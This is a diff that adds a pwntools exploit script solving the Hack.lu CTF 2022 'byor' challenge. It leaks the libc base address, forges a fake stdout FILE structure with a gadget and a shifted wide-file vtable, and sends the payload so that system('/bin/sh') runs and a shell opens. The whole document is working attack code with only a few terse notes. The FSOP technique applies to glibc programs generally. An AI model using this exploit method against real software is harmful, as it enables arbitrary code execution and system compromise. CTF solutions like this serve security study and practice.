@@ -1,0 +1,48 @@
+from pwn import *
+
+# https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor
+# https://aneii11.github.io/p/fsop-code-execution/
+# note: (about the blog)
+# something about jump table, it is not 0x18 shift
+# padding the __pad5 to write section
+# DL_CALL_FCT(fct, (gs, ..)) will actually call the func fct(gs, ....)
+
+libc = ELF("./libc.so.6")
+
+script = '''
+b *main + 83
+b *main + 142
+'''
+
+p = process("./byor_patched")
+#p = gdb.debug("./byor_patched", gdbscript = script)
+
+p.recvuntil(b"foundation: ")
+libc_base = int(b"0x" + p.recvline(), 16) - 0x21a780
+print(hex(libc_base))
+
+system = libc_base + libc.symbols['system']
+add_rdi_0x10_jmp_rcx = libc_base + 0x0000000000163830
+_IO_stdfile_1_lock = libc_base + libc.symbols['_IO_stdfile_1_lock']
+_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
+fake_vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x18
+
+fake_stdout = [p64(0x3b01010101010101), # _flags
+               p64(0),
+               p64(system), # _IO_read_end
+               p64(0) * 3,
+               b"/bin/sh\x00", # _IO_write_end
+               p64(0) * 2,
+               p64(add_rdi_0x10_jmp_rcx), # _IO_save_base
+               p64(0) * 7,
+               p64(_IO_stdfile_1_lock), # _lock
+               p64(0),
+               p64(_IO_2_1_stdout_ + 0xb8), # _codecvt
+               p64(_IO_2_1_stdout_ + 0x200), # _wide_data
+               p64(0) * 2 + p64(_IO_2_1_stdout_ + 0x20) + p64(0) * 3, # padding the __pad5
+               p64(fake_vtable) # vtable
+               ]
+payload = b"".join(fake_stdout)
+p.send(payload)
+
+p.interactive()
